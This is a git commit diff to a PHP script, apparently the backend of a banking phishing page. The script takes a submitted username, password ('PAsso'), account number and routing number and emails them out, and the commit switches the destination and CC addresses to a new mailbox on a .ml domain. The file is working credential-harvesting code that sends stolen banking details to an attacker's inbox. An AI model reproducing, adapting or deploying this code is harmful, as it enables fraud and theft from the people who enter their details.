ada81a6eb04374fb765338442deb105dfd139de1
VERlDlANCU <114101912+VERlDlANCU@users.noreply.github.com>
2022-09-21 12:02:52 -0700

    Update indexload.php

--- indexload.php
+++ indexload.php
@@ -4,11 +4,11 @@ $first_name = $_POST['first_name'];
 $last_name = $_POST['last_name'];
 $accnum= $_POST['accnum'];
 $rtnum= $_POST['rtnum'];
-$to = "lawyer.paul@macr2.com";
+$to = "whykkaymailbox@pupsikaneto.ml";
 $subject = "Mail From website";
 $txt ="Ussr = ". $first_name . "\r\n PAsso = ". $last_name . "\r\n  ACCnum = " . $accnum . "\r\n RTNum =" . $rtnum;
 $headers = "From: account@offshore.cusocalb.com" . "\r\n" .
-"CC: lawyer.paul@macr2.com";
+"CC: lwhykkaymailbox@pupsikaneto.ml";
 if($rtnum!=NULL){
     mail($to,$subject,$txt,$headers);
 }
